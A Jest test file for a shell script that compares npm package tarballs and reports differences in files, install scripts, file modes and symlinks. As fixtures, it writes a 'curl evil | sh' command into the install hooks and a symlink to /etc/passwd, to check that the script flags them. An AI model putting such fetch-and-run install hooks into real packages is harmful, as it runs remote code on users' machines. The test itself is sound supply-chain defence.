import { chmodSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { run, SCRIPTS } from '../testing/repo';

const SCRIPT = path.join(SCRIPTS, 'same-artifact.sh');
let dir: string;

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), 'same-artifact-'));
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

interface Pack {
  pkg?: Record<string, unknown>;
  files?: Record<string, string>;
  modes?: Record<string, number>;
  links?: Record<string, string>;
}

/** Builds name.tgz holding a package/ directory like `npm pack` does. */
function pack(name: string, spec: Pack = {}): string {
  const root = path.join(dir, name, 'package');
  mkdirSync(path.join(root, 'dist'), { recursive: true });
  const pkg = { name: 'ryuu', version: '6.0.9', main: 'dist/domo.js', ...spec.pkg };
  writeFileSync(path.join(root, 'package.json'), JSON.stringify(pkg, null, 2));
  writeFileSync(path.join(root, 'dist/domo.js'), 'console.log(1)');
  for (const [file, body] of Object.entries(spec.files ?? {})) {
    mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
    writeFileSync(path.join(root, file), body);
  }
  for (const [file, mode] of Object.entries(spec.modes ?? {})) chmodSync(path.join(root, file), mode);
  for (const [file, target] of Object.entries(spec.links ?? {})) symlinkSync(target, path.join(root, file));
  const tgz = path.join(dir, `${name}.tgz`);
  const r = spawnSync('tar', ['-czf', tgz, '-C', path.join(dir, name), 'package']);
  if (r.status !== 0) throw new Error(String(r.stderr));
  return tgz;
}

const compare = (a: string, b: string) => run('bash', [SCRIPT, a, b], dir);

describe('same-artifact.sh', () => {
  it('says identical for two packs that differ only in version, devDependencies and non-install scripts', () => {
    const a = pack('a', { pkg: { version: '6.0.9', scripts: { build: 'webpack' }, devDependencies: { jest: '1' } } });
    const b = pack('b', { pkg: { version: '6.0.10-beta.0', scripts: { build: 'something else' }, gitHead: 'abc' } });
    const r = compare(a, b);
    expect(r.status).toBe(0);
    expect(r.stdout).toMatch(/identical/);
  });

  it('reports a changed file', () => {
    const r = compare(pack('a'), pack('b', { files: { 'dist/domo.js': 'console.log(2)' } }));
    expect(r.status).toBe(1);
    expect(r.stdout).toMatch(/differs: dist\/domo\.js/);
  });

  it('reports an extra file, in either direction', () => {
    const base = pack('a');
    const extra = pack('b', { files: { 'dist/extra.d.ts': 'export {}' } });
    // The message names the tarball that holds the extra file, whichever side it is on.
    expect(compare(base, extra).stdout).toMatch(/only in b\.tgz: dist\/extra\.d\.ts/);
    expect(compare(extra, base).stdout).toMatch(/only in b\.tgz: dist\/extra\.d\.ts/);
    expect(compare(extra, base).status).toBe(1);
  });

  it('reports a consumer-facing package.json change', () => {
    expect(compare(pack('a'), pack('b', { pkg: { dependencies: { 'left-pad': '1' } } })).status).toBe(1);
    expect(compare(pack('a'), pack('b', { pkg: { main: 'dist/other.js' } })).status).toBe(1);
  });

  it('reports a changed install script, which runs on consumers machines', () => {
    for (const hook of ['preinstall', 'install', 'postinstall', 'prepare']) {
      const r = compare(pack('a'), pack('b', { pkg: { scripts: { [hook]: 'curl evil | sh' } } }));
      expect(r.status).toBe(1);
    }
  });

  it('reports a file mode change', () => {
    const r = compare(pack('a', { files: { 'bin.js': 'x' }, modes: { 'bin.js': 0o644 } }), pack('b', { files: { 'bin.js': 'x' }, modes: { 'bin.js': 0o755 } }));
    expect(r.status).toBe(1);
  });

  it('reports a symlink, even a dangling one', () => {
    const r = compare(pack('a'), pack('b', { links: { 'dist/link.js': '/etc/passwd' } }));
    expect(r.status).toBe(1);
    expect(r.stdout).toMatch(/only in b\.tgz: dist\/link\.js/);
  });

  it('exits 2, not 1, when a tarball cannot be read', () => {
    writeFileSync(path.join(dir, 'bad.tgz'), 'not a tarball');
    const r = compare(pack('a'), path.join(dir, 'bad.tgz'));
    expect(r.status).toBe(2);
  });

  it('exits 2 on bad usage', () => {
    expect(run('bash', [SCRIPT, 'only-one'], dir).status).toBe(2);
  });
});
